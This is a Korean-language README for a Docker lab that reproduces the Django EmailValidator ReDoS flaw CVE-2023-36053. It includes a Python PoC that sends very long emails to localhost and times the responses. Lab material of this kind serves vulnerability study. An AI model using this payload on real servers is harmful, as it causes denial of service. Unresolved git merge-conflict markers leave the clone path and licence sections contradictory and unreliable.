# Vulnerable Django Email Validation App (CVE-2023-36053)

이 프로젝트는 Django의 `EmailValidator`에서 발생하는 **CVE-2023-36053** ReDoS 취약점을 PoC하기 위한 환경을 제공합니다. 긴 이메일 입력을 통해 서비스 거부 공격을 재현할 수 있습니다.

---

## 📂 Project Structure

```
CVE-2023-36053
├── Dockerfile
├── docker-compose.yaml
├── requirements.txt
├── manage.py
├── config/
│   ├── __init__.py
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
└── vuln_app/
    ├── __init__.py
    ├── views.py
    └── urls.py
```

---

## 🚀 Prerequisites

- **Docker** 20.10 이상 설치  
- **docker-compose** 1.29 이상 설치  

---

## 🐳 Docker & Docker Compose 환경 구성

1. **레포지토리 클론**
   ```bash
   git clone https://github.com/yourusername/vuln-django-email.git
<<<<<<< HEAD
   cd Django/CVE-2023-36053
=======
   cd kr-vulhub/Django/CVE-2023-36053/CVE-2023
>>>>>>> 41f7ce99a4fdea865beaa332bf69fd7d51110093
   ```

2. **Docker 이미지 빌드**
   ```bash
   docker-compose build
   ```

3. **컨테이너 실행**
   ```bash
   docker-compose up -d
   ```

4. **서버 상태 확인**
   ```bash
   docker-compose ps
   ```
   - `web` 서비스의 `0.0.0.0:8000->8000/tcp` 바인딩 확인

5. **애플리케이션 접속 테스트**
   ```bash
   curl http://localhost:8000/vuln/ -d "email=test@example.com"
   ```

---

## 🔧 Dockerfile

```dockerfile
FROM python:3.9-slim
WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .
EXPOSE 8000
CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
```

---

## 🔧 docker-compose.yaml

```yaml
version: "3"
services:
  web:
    build: .
    ports:
      - "8000:8000"
    volumes:
      - .:/app
    environment:
      - PYTHONUNBUFFERED=1
```

---

## 📋 Dependencies

- `Django==4.2.2`
- `requests`

```text
# requirements.txt
Django==4.2.2
requests
```

---

## 🎯 PoC 스크립트 (poc.py)

긴 이메일 입력에 따른 응답 시간을 측정하는 스크립트입니다:

```python
import requests
import time

def test_email(lengths):
    url = "http://localhost:8000/vuln/"
    for n in lengths:
        email = "test@" + ("a." * n) + "example.com"
        start = time.time()
        res = requests.post(url, data={"email": email})
        elapsed = time.time() - start
        print(f"labels={n}, status={res.status_code}, time={elapsed:.3f}s")

if __name__ == "__main__":
    test_email([10, 100, 1000, 10000, 50000])
```

---

## 📋 Endpoints

- **POST** `/vuln/`
  - Form data: `email` (string)
  - Response: `Valid` 또는 `Invalid`

---

## 📈 테스트 및 결과

1. `docker-compose up -d` 후 서버 실행  
2. `python3 poc.py` 실행  
3. 입력 길이에 따른 응답 시간 변화 확인

![image](https://github.com/user-attachments/assets/be10d405-27fe-451e-a5c3-78cf0a32579a)


*라벨 수가 늘어남에 따라 처리 지연이 기하급수적으로 증가함을 확인할 수 있습니다.*

---

## 📄 License

<<<<<<< HEAD
MIT License. 자세한 내용은 [LICENSE](LICENSE) 파일을 참고하세요.

---

## 🔗 GitHub Repository

[https://github.com/yourusername/vuln-django-email](https://github.com/yourusername/vuln-django-email)
=======
MIT License. See [LICENSE](LICENSE) for details.
>>>>>>> 41f7ce99a4fdea865beaa332bf69fd7d51110093
